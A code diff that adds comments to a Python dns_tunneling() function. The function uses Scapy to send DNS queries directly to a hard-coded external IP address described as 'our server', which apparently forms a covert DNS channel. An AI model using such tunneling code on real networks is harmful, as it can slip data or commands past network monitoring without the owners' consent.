@@ -393,6 +393,8 @@ def dns_tunneling():
         # Have to point the DNS request directly to our server, 
         # Should work if our DNS server was a Authoritative one 
         # Uses scapy inet IP to prepare the DNS request
+        # Might not need rd=1, as its recursion desired, will test in the future
+        # qd isquestion domain section in the DNS packet and refers to the domain we want to find the IP adress for
         dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname)) 
         answer = sr1(dns_req, verbose=1, timeout=5) # sr1 sends the DNS requests and waits for repsonse
         if answer:
